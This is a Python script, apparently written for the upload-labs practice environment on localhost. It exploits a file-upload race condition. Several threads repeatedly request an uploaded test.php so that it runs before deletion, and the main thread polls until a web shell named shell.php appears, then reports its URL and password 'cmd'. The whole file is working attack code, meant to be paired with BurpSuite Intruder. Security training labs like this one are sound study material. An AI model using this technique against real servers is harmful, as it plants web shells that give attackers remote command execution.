import requests
import threading
import time

BASE = "http://127.0.0.1:81/upload-labs/upload"
found = False #全局标志, 找到shell即停
def trigger():
    # 不断访问 test.php 触发php执行
    global found
    while not found:
        try:
            requests.get(f"{BASE}/test.php", timeout=2)
        except:
            pass
def check():
    # 不断检测shell.php 是否存在
    global found
    while not found:
        try:
            r = requests.get(f"{BASE}/shell.php", timeout=2)
            if r.status_code == 200:
                found = True
                print(f"\n[+] shell OK!")
                print(f"[+]link:{BASE}/shell.php")
                print(f"[+]password: cmd")
                return
        except:
            pass
        time.sleep(0.05)
if __name__ == "__main__":
    print("[*] 先启动BurpSuite-Intruder, 按回车开始..")
    input()
    
    for _ in range(5): # 5个触发线程
        threading.Thread(target=trigger, daemon=True).start()
    check()            # 主线程负责检测